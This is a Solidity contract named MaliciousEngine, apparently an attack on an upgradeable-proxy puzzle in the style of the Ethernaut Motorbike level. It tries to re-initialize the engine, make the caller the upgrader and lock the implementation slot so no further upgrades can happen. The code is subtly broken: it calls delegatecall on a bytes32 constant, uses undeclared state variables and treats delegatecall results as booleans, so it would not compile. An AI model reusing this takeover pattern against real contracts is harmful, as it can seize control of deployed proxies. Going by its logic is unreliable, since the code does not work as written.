pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/proxy/Initializable.sol";
import "openzeppelin-contracts-06/utils/Address.sol";

contract MaliciousEngine is Initializable {
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    // Define the AddressSlot struct at contract level
    struct AddressSlot {
        address value;
    }

    function initialize() public initializer {
        // Call original initialize and then overwrite upgrader
        (bool success,) = _IMPLEMENTATION_SLOT.delegatecall(abi.encodeWithSignature("initialize()"));
        require(success);
        
        // Set upgrader to our address and horsePower to 2000
        (success,) = _IMPLEMENTATION_SLOT.delegatecall(abi.encodeWithSignature("__MaliciousEngine_init()"));
        require(success);
    }

    function __MaliciousEngine_init() public initializer {
        horsePower = 2000;
        upgrader = msg.sender;
    }

    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    function _upgradeToAndCall(address x) external payable {
        // Set implementation to itself to prevent future upgrades
        AddressSlot storage r = _getAddressSlot(_IMPLEMENTATION_SLOT);
        r.value = address(this);
        
        if (x.delegatecall(abi.encodeWithSignature("initialize()"))) {
            if (x.delegatecall(abi.encodeWithSignature("__MaliciousEngine_init()"))) {
                // Execute arbitrary code here if needed
            }
        }
    }

    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}
